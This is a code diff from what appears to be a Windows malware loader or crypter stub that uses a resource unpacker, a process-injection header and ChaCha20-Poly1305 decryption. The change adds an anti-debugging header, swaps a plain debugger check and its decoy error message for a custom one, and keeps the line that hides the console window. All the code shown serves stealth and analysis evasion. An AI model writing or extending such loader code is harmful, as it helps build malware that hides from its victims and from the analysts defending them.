@@ -5,6 +5,7 @@
 #include "crypto/chacha20-poly1305/chacha20poly1305.h"
 #include "headers/unpacker.h"
 #include "headers/injection.h"
+#include "headers/anti_debug.h"
 
 static unsigned char* GetResource(int resourceId, char* resourceType, unsigned long* dwSize)
 {
@@ -42,12 +43,9 @@ static void CleanupResources(Resources* res, CryptoContext* crypto, uint8_t* dec
 
 int main()
 {
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    _IsDebuggerPresent();
 
-    if (IsDebuggerPresent()) {
-        OutputDebugStringA("Oops! Unexpected failure.");
-        return 1;
-    }
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     Resources res = {0};
     CryptoContext crypto = {0};
